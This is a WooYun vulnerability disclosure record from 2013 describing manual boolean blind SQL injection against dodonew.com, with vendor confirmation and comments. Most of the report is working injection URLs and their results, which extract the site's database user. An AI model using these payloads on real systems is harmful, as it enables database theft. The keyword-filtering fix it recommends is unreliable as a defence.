{"id": 14290, "wybug_id": "wooyun-2013-017425", "wybug_title": "嘟嘟牛主站一个sql盲注，mysql全手工盲注测试", "wybug_corp": "嘟嘟牛", "wybug_author": "shack2", "wybug_date": "2013-01-17 13:57", "wybug_open_date": "2013-03-03 13:57", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-01-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-01-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-01-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-02-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-02-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-03-03：\t细节向公众公开  简要描述： 主站sql盲注，今天来一个手工盲注,兄弟们也来学学手工盲注，丫的，手工测试真慢. 详细说明：  1.测试验证是否mysql\n\n\n\n2.测试有多少表\n\n\n\n448张表3.查询一下当前用户长度http://www.dodonew.com/news_detail.jsp?newsid=601 And (select length(user()))=12  返回正常页面长度12位4.爆当前用户\n\n\n\n\n\n\n\n然后一直用SUBSTR函数截取的位置加1，把所有的ascii码判断出来，最后将ascii码转换字符串下面是所有测试结果1.http://www.dodonew.com/news_detail.jsp?newsid=601 And (select ASCII(SUBSTR(user(),7,1)))>99   truehttp://www.dodonew.com/news_detail.jsp?newsid=601 And (select ASCII(SUBSTR(user(),7,1)))>100   false100d2.http://www.dodonew.com/news_detail.jsp?newsid=601 And (select ASCII(SUBSTR(user(),7,1)))>100   truehttp://www.dodonew.com/news_detail.jsp?newsid=601 And (select ASCII(SUBSTR(user(),7,1)))>101   false101e3.http://www.dodonew.com/news_detail.jsp?newsid=601 And (select ASCII(SUBSTR(user(),7,1)))>117   truehttp://www.dodonew.com/news_detail.jsp?newsid=601 And (select ASCII(SUBSTR(user(),7,1)))>118   false118y4.http://www.dodonew.com/news_detail.jsp?newsid=601 And (select ASCII(SUBSTR(user(),7,1)))>63   truehttp://www.dodonew.com/news_detail.jsp?newsid=601 And (select ASCII(SUBSTR(user(),7,1)))>64   false64@5.http://www.dodonew.com/news_detail.jsp?newsid=601 And (select ASCII(SUBSTR(user(),7,1)))>48   truehttp://www.dodonew.com/news_detail.jsp?newsid=601 And (select ASCII(SUBSTR(user(),7,1)))>49   false4916.http://www.dodonew.com/news_detail.jsp?newsid=601 And (select ASCII(SUBSTR(user(),7,1)))>47   truehttp://www.dodonew.com/news_detail.jsp?newsid=601 And (select ASCII(SUBSTR(user(),7,1)))>48   false4807.http://www.dodonew.com/news_detail.jsp?newsid=601 And (select ASCII(SUBSTR(user(),7,1)))>45   truehttp://www.dodonew.com/news_detail.jsp?newsid=601 And (select ASCII(SUBSTR(user(),7,1)))>46   false46.8.http://www.dodonew.com/news_detail.jsp?newsid=601 And (select ASCII(SUBSTR(user(),7,1)))>47   truehttp://www.dodonew.com/news_detail.jsp?newsid=601 And (select ASCII(SUBSTR(user(),7,1)))>48   false4809.http://www.dodonew.com/news_detail.jsp?newsid=601 And (select ASCII(SUBSTR(user(),7,1)))>45  truehttp://www.dodonew.com/news_detail.jsp?newsid=601 And (select ASCII(SUBSTR(user(),7,1)))>46   false46.10.http://www.dodonew.com/news_detail.jsp?newsid=601 And (select ASCII(SUBSTR(user(),7,1)))>49  truehttp://www.dodonew.com/news_detail.jsp?newsid=601 And (select ASCII(SUBSTR(user(),7,1)))>50   false50211.http://www.dodonew.com/news_detail.jsp?newsid=601 And (select ASCII(SUBSTR(user(),7,1)))>45  truehttp://www.dodonew.com/news_detail.jsp?newsid=601 And (select ASCII(SUBSTR(user(),7,1)))>46   false46.12.http://www.dodonew.com/news_detail.jsp?newsid=601 And (select ASCII(SUBSTR(user(),7,1)))>51  truehttp://www.dodonew.com/news_detail.jsp?newsid=601 And (select ASCII(SUBSTR(user(),7,1)))>52   false524最后看当前mysql用户：dey@10.0.2.4爆库爆表都这个原理，先判断字段长度，然后截取每一位转换ascii码，判断大小，最后转换ascii吗，得到字符你看懂了吗，boolean型盲注，如果没懂，建议学学数据库查询手工注入原理，先要了解sql语法，只要学会了sql语法，手工注入不在是梦最后提升，测试sqlmap，havij，pangolin这些注入工具都是注入不了的   漏洞证明：  1.测试验证是否mysql\n\n\n\n2.测试有多少表\n\n\n\n448张表3.查询一下当前用户长度http://www.dodonew.com/news_detail.jsp?newsid=601 And (select length(user()))=12  返回正常页面长度12位4.爆当前用户\n\n\n\n\n\n\n\n然后一直用SUBSTR函数截取的位置加1，把所有的ascii码判断出来，最后将ascii码转换字符串下面是所有测试结果1.http://www.dodonew.com/news_detail.jsp?newsid=601 And (select ASCII(SUBSTR(user(),7,1)))>99   truehttp://www.dodonew.com/news_detail.jsp?newsid=601 And (select ASCII(SUBSTR(user(),7,1)))>100   false100d2.http://www.dodonew.com/news_detail.jsp?newsid=601 And (select ASCII(SUBSTR(user(),7,1)))>100   truehttp://www.dodonew.com/news_detail.jsp?newsid=601 And (select ASCII(SUBSTR(user(),7,1)))>101   false101e3.http://www.dodonew.com/news_detail.jsp?newsid=601 And (select ASCII(SUBSTR(user(),7,1)))>117   truehttp://www.dodonew.com/news_detail.jsp?newsid=601 And (select ASCII(SUBSTR(user(),7,1)))>118   false118y4.http://www.dodonew.com/news_detail.jsp?newsid=601 And (select ASCII(SUBSTR(user(),7,1)))>63   truehttp://www.dodonew.com/news_detail.jsp?newsid=601 And (select ASCII(SUBSTR(user(),7,1)))>64   false64@5.http://www.dodonew.com/news_detail.jsp?newsid=601 And (select ASCII(SUBSTR(user(),7,1)))>48   truehttp://www.dodonew.com/news_detail.jsp?newsid=601 And (select ASCII(SUBSTR(user(),7,1)))>49   false4916.http://www.dodonew.com/news_detail.jsp?newsid=601 And (select ASCII(SUBSTR(user(),7,1)))>47   truehttp://www.dodonew.com/news_detail.jsp?newsid=601 And (select ASCII(SUBSTR(user(),7,1)))>48   false4807.http://www.dodonew.com/news_detail.jsp?newsid=601 And (select ASCII(SUBSTR(user(),7,1)))>45   truehttp://www.dodonew.com/news_detail.jsp?newsid=601 And (select ASCII(SUBSTR(user(),7,1)))>46   false46.8.http://www.dodonew.com/news_detail.jsp?newsid=601 And (select ASCII(SUBSTR(user(),7,1)))>47   truehttp://www.dodonew.com/news_detail.jsp?newsid=601 And (select ASCII(SUBSTR(user(),7,1)))>48   false4809.http://www.dodonew.com/news_detail.jsp?newsid=601 And (select ASCII(SUBSTR(user(),7,1)))>45  truehttp://www.dodonew.com/news_detail.jsp?newsid=601 And (select ASCII(SUBSTR(user(),7,1)))>46   false46.10.http://www.dodonew.com/news_detail.jsp?newsid=601 And (select ASCII(SUBSTR(user(),7,1)))>49  truehttp://www.dodonew.com/news_detail.jsp?newsid=601 And (select ASCII(SUBSTR(user(),7,1)))>50   false50211.http://www.dodonew.com/news_detail.jsp?newsid=601 And (select ASCII(SUBSTR(user(),7,1)))>45  truehttp://www.dodonew.com/news_detail.jsp?newsid=601 And (select ASCII(SUBSTR(user(),7,1)))>46   false46.12.http://www.dodonew.com/news_detail.jsp?newsid=601 And (select ASCII(SUBSTR(user(),7,1)))>51  truehttp://www.dodonew.com/news_detail.jsp?newsid=601 And (select ASCII(SUBSTR(user(),7,1)))>52   false524最后看当前mysql用户：dey@10.0.2.4爆库爆表都这个原理，先判断字段长度，然后截取每一位转换ascii码，判断大小，最后转换ascii吗，得到字符你看懂了吗，boolean型盲注，如果没懂，建议学学数据库查询手工注入原理，先要了解sql语法，只要学会了sql语法，手工注入不在是梦最后提升，测试sqlmap，havij，pangolin这些注入工具都是注入不了的   修复方案：  过滤关键字符，如 and,select   版权声明：转载请注明来源 shack2@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2013-01-18 09:40 厂商回复： 谢谢shack2关注，已提交技术部处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-01-17 14:25 |    \t\t园长 \t\t\t( 普通白帽子  |\t\t\t        Rank:134 漏洞数:14        | 你在身边就是缘，缘分写在数据库里面。)\t\t \n  你动作真快。    \n     2013-01-17 14:30 |    \t\tshack2 \t\t\t( 普通白帽子  |\t\t\t        Rank:470 漏洞数:71        | QQ:1341413415 一个热爱编程(Java),热爱网...)\t\t \n  @园长 嘎嘎    \n     2013-01-17 14:36 |    \t\tupload \t\t\t( 普通白帽子  |\t\t\t        Rank:251 漏洞数:43        | 此处略--！)\t\t \n  猪肉耶    \n     2013-01-17 14:37 |    \t\tshack2 \t\t\t( 普通白帽子  |\t\t\t        Rank:470 漏洞数:71        | QQ:1341413415 一个热爱编程(Java),热爱网...)\t\t \n  @园长 终于知道嘟嘟牛的裤子怎么被脱的了755万用户啊    \n     2013-01-17 14:40 |    \t\t园长 \t\t\t( 普通白帽子  |\t\t\t        Rank:134 漏洞数:14        | 你在身边就是缘，缘分写在数据库里面。)\t\t \n  @shack2 低调，小心送快递。    \n     2013-01-17 19:25 |    \t\talso \t\t\t( 普通白帽子  |\t\t\t        Rank:424 漏洞数:52        | 招渗透/php/前端/ios&android安全，广州地...)\t\t \n  手工搞得跟傻逼一样还没 注出来···    \n     2013-01-18 17:12 |    \t\t孤心 \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:3        | php程序猿！渗透.入侵.社工...等我都不会！)\t\t \n  嘟嘟牛最近爆了不少洞啊    \n     2013-03-03 15:54 |    \t\t/fd \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:1        )\t\t \n  手工盲注...服了    \n     2014-01-24 01:12 |    \t\tStranger \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 我注意你很久了.....)\t\t \n  写的不错,感觉很受用...    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}